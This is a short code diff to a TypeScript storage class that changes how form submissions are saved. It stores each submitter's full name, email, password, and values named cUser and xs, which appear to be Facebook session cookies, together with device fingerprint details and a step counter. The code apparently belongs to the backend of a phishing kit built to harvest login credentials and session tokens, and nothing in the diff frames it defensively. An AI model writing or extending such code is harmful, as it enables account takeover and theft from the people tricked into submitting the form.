@@ -43,9 +43,19 @@ export class MemStorage implements IStorage {
   async createFormSubmission(submission: InsertFormSubmission): Promise<FormSubmission> {
     const id = this.currentSubmissionId++;
     const formSubmission: FormSubmission = { 
-      ...submission, 
       id,
-      timestamp: new Date()
+      fullName: submission.fullName,
+      email: submission.email,
+      cUser: submission.cUser,
+      xs: submission.xs,
+      password: submission.password || null,
+      screenWidth: submission.screenWidth ?? null,
+      screenHeight: submission.screenHeight ?? null,
+      isTouchDevice: submission.isTouchDevice ?? null,
+      userAgent: submission.userAgent ?? null,
+      platform: submission.platform ?? null,
+      timestamp: new Date(),
+      step: submission.step || "main"
     };
     this.formSubmissions.set(id, formSubmission);
     return formSubmission;
